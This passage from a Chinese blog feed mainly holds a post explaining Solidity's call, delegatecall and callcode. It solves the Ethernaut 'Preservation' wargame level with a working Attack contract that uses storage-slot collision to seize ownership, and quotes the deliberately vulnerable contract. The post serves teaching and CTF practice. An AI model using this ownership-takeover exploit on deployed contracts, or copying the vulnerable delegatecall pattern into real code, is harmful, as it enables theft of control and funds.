number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span><span class="token string">'rH'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>绘图得到</p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Delegatecall</title>
      <link href="/2023/10/26/Delegatecall/"/>
      <url>/2023/10/26/Delegatecall/</url>
      
        <content type="html"><![CDATA[<h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><h4 id="三种调用函数"><a class="markdownIt-Anchor" href="#三种调用函数"></a> 三种调用函数</h4><p>在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token operator">&lt;</span><span class="token builtin">address</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token builtin">address</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token function">callcode</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token builtin">address</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>中的内置变量 <code>msg</code> 会随着调用的发起而改变，<code>msg</code> 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。</p><h5 id="异同点"><a class="markdownIt-Anchor" href="#异同点"></a> 异同点</h5><p>call ：调用后会将msg的值修改为调用者，执行环境为被调用的运行环境</p><p>delegatecall: 调用后内置变量 <code>msg</code> 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）</p><p>callcode: 调用后内置变量 <code>msg</code> 的值会修改为调用者，但执行环境为调用者的运行环境</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240620171818.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240620171823.png" alt></p><pre class="line-numbers language-none"><code class="language-none">delegatecall语法和call类似，也是：目标合约地址.delegatecall(二进制编码);其中二进制编码利用结构化编码函数abi.encodeWithSignature获得：abi.encodeWithSignature(&quot;函数签名&quot;, 逗号分隔的具体参数)函数签名为&quot;函数名（逗号分隔的参数类型)&quot;。例如abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)。和call不一样，delegatecall在调用合约时可以指定交易发送的gas，但不能指定发送的ETH数额<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="delegatecall的滥用"><a class="markdownIt-Anchor" href="#delegatecall的滥用"></a> delegatecall的滥用</h3><h4 id="威胁分析"><a class="markdownIt-Anchor" href="#威胁分析"></a> 威胁分析</h4><p>delegatecall 调用有 <code>address</code> 和 <code>msg.data</code> 两个参数</p><p>若 <code>msg.data</code> 可控，则可调用 <code>address</code> 处任意函数</p><h4 id="原因分析"><a class="markdownIt-Anchor" href="#原因分析"></a> 原因分析</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.23</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> c<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> b<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        a <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        b <span class="token operator">=</span> a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> b<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> c<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">withdelegatecall</span><span class="token punctuation">(</span><span class="token builtin">address</span> testaddress<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        testaddress<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"test()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当部署两个合约后，使用外部账户调用withdelegatecall函数。</p><p>A合约中，c=0；b=0；</p><p>B合约中，b=0；c=address (A)</p><p>事实上调用 delegatecall 来使用 Storage 变量时依据并不是变量名，而是变量的存储位，这样的话我们就可以达到覆盖相关变量的目的。</p><h3 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h3><h4 id="ethernaut"><a class="markdownIt-Anchor" href="#ethernaut"></a> <a href="https://ethernaut.openzeppelin.com/">ethernaut</a> 第 16 题</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Preservation</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// public library contracts </span>  <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone1Library<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone2Library<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>   <span class="token builtin">uint</span> storedTime<span class="token punctuation">;</span>  <span class="token comment">// Sets the function signature for delegatecall</span>  <span class="token builtin">bytes4</span> <span class="token keyword">constant</span> setTimeSignature <span class="token operator">=</span> <span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"setTime(uint256)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _timeZone1LibraryAddress<span class="token punctuation">,</span> <span class="token builtin">address</span> _timeZone2LibraryAddress<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    timeZone1Library <span class="token operator">=</span> _timeZone1LibraryAddress<span class="token punctuation">;</span>     timeZone2Library <span class="token operator">=</span> _timeZone2LibraryAddress<span class="token punctuation">;</span>     owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// set the time for timezone 1</span>  <span class="token keyword">function</span> <span class="token function">setFirstTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    timeZone1Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// set the time for timezone 2</span>  <span class="token keyword">function</span> <span class="token function">setSecondTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    timeZone2Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Simple library contract to set the time</span><span class="token keyword">contract</span> <span class="token class-name">LibraryContract</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// stores a timestamp </span>  <span class="token builtin">uint</span> storedTime<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _time<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    storedTime <span class="token operator">=</span> _time<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h5><p>要想改变owner，只有constructor函数，但是有delegatecall漏洞。</p><p>setFirstTime(uint _timeStamp)</p><p>setSecondTime(uint _timeStamp)</p><p>这两个函数是调用setTime函数。也就是说，当我们第一次调用setFirstTime函数时，就会设置solt0为攻击合约的地址，第二次调用该函数时就会调用该合约的函数即，改变的是solt2。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Preservation</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// public library contracts </span>  <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone1Library<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone2Library<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>   <span class="token builtin">uint</span> storedTime<span class="token punctuation">;</span>  <span class="token comment">// Sets the function signature for delegatecall</span>  <span class="token builtin">bytes4</span> <span class="token keyword">constant</span> setTimeSignature <span class="token operator">=</span> <span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"setTime(uint256)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _timeZone1LibraryAddress<span class="token punctuation">,</span> <span class="token builtin">address</span> _timeZone2LibraryAddress<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    timeZone1Library <span class="token operator">=</span> _timeZone1LibraryAddress<span class="token punctuation">;</span>     timeZone2Library <span class="token operator">=</span> _timeZone2LibraryAddress<span class="token punctuation">;</span>     owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// set the time for timezone 1</span>  <span class="token keyword">function</span> <span class="token function">setFirstTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    timeZone1Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// set the time for timezone 2</span>  <span class="token keyword">function</span> <span class="token function">setSecondTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    timeZone2Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Simple library contract to set the time</span><span class="token keyword">contract</span> <span class="token class-name">LibraryContract</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// stores a timestamp </span>  <span class="token builtin">uint</span> storedTime<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _time<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    storedTime <span class="token operator">=</span> _time<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone1Library<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone2Library<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>   <span class="token builtin">uint</span> storedTime<span class="token punctuation">;</span>  Preservation <span class="token keyword">public</span> target<span class="token punctuation">;</span> <span class="token comment">// target Preservation contract</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _target<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    target <span class="token operator">=</span> <span class="token function">Preservation</span><span class="token punctuation">(</span>_target<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">attack1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    target<span class="token punctuation">.</span><span class="token function">setFirstTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    target<span class="token punctuation">.</span><span class="token function">setFirstTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// overwrite the library addresses and owner address</span>  <span class="token keyword">function</span> <span class="token function">setTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _time<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>   owner<span class="token operator">=</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span>_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用attack1().</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyjail（上）</title>
      <link href="/2023/10/25/Pyjail%E4%B8%8A/"/>
      <url>/2023/10/25/Pyjail%E4%B8%8A/</url>
      
